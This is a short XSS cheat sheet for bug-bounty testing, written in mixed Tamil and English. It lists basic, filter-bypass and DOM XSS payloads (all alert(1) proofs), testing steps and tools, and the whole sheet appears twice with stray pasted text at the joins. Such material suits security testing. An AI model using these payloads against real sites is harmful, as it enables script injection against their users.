# XSS - Cross Site Scripting

## What is XSS?
User input ah filter pannama page la kaamichu, attacker script run pannina XSS da.

## Basic Payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
"'><script>alert(1)</script>

## WAF Bypass Payloads
<scr<script>ipt>alert(1)</scr<script>ipt>
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
<ScRiPt>alert(1)</ScRiPt>

## DOM XSS
#<img src=x onerror=alert(1)>
javascript:alert(1)

## How to Test
1. Input box la <h1>test</h1> potu paaru
2. Reflect aagutha nu paaru
3. <script>alert(1)</script> try pannu
4. Burp Repeater la encode/decode try pannu

## Checklist
- [ ] Reflected XSS test panniya?
- [ ] Stored XSS test panniya?
- [ ] DOM XSS test panniya?
- [ ] Filter bypass try panniya?

## Tools
- Burp Suite
- Dalfox - dalfox url target.com
- XSS Hunter

---
Made by Madhan - Trichy to BugcrowdEnter## XSS - Cross Site Scripting

## What is XSS?
User input ah filter pannama page la kaamichu, attacker script run pannina XSS da.

## Basic Payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
"'><script>alert(1)</script>

## WAF Bypass Payloads
<scr<script>ipt>alert(1)</scr<script>ipt>
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
<ScRiPt>alert(1)</ScRiPt>

## DOM XSS
#<img src=x onerror=alert(1)>
javascript:alert(1)

## How to Test
1. Input box la <h1>test</h1> potu paaru
2. Reflect aagutha nu paaru
3. <script>alert(1)</script> try pannu
4. Burp Repeater la encode/decode try pannu

## Checklist
- [ ] Reflected XSS test panniya?
- [ ] Stored XSS test panniya?
- [ ] DOM XSS test panniya?
- [ ] Filter bypass try panniya?

## Tools
- Burp Suite
- Dalfox - dalfox url target.com
- XSS Hunter

---
Made by Madhan - Trichy to BugcrowdEnterwd
